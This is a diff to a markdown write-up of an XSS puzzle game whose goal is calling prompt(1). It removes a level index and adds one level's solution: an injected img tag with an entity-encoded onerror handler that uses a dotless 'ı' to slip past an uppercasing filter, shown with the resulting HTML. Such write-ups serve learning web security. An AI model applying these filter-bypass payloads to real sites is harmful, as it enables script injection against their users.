@@ -12,23 +12,6 @@ tags:
 
 This is a XSS injection game inspired by alert(1) to win. Call prompt(1) to win. You should make it without user interaction.
 
-## Challenges
-- [Level 0](#level-0)
-- [Level 1](#level-1)
-- [Level 2](#level-2)
-- [Level 3](#level-3)
-- Level 4
-- Level 5
-- Level 6
-- [Level 7](#level-7)
-- Level 8
-- Level 9
-- [Level A](#level-a)
-- [Level B](#level-b)
-- [Level C](#level-c)
-- Level D
-- Level E
-- [Level F](#level-f)
 
 ## Level 0
 
@@ -302,6 +285,17 @@ function escape(input) {
 }
 ```
 
+- Solution
+
+```
+</h1><ımg src="x" onerror="&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)"/>
+```
+
+- HTML Source
+
+```
+<h1></H1><IMG SRC="X" ONERROR="&#X70;&#X72;&#X6F;&#X6D;&#X70;&#X74;(1)"/></h1>
+```
 
 ## Level A
 
